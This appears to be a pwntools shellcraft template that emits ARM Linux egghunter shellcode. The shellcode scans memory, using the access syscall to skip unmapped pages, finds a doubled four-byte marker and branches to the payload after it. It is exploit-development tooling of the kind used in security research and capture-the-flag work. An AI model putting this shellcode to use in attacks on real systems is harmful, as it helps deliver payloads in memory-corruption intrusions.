<% from pwnlib.shellcraft.arm import mov %>
<% from pwnlib.util.packing import unpack %>
<% from pwnlib import constants %>
<%page args="egg = None"/>
<%docstring>
    egghunter(egg)

    Searches for an egg, which is either a four byte integer
    or a four byte string. The egg must appear twice in a row.
    When the egg has been found the egghunter branches to the
    address following it.
</%docstring>
<%
    if not isinstance(egg, (int, long)):
        egg = unpack(egg)
%>
egghunter:
    eor r1, r1, r1
    mov r2, r1

    /* Put egg in r3 */
    ${mov('r3', egg)}

next_page:
    mvn r1, r1, lsr #0x0c
    mvn r1, r1, lsl #0x0c

next_byte:
    add r1, r1, #0x01

    add r0, r1, #0x07
    ${mov('r7', constants.linux.arm.SYS_access)}
    swi #0

    /* EFAULT = ${constants.linux.arm.EFAULT} means unmapped memory */
    cmn r0, #${constants.linux.arm.EFAULT}
    beq next_page

    ldm r1, {r4, r5}

    cmp r4, r3
    bne next_byte
    cmp r5, r3
    bne next_byte

egg_found:
    add r1, r1, #0x08
    bx  r1
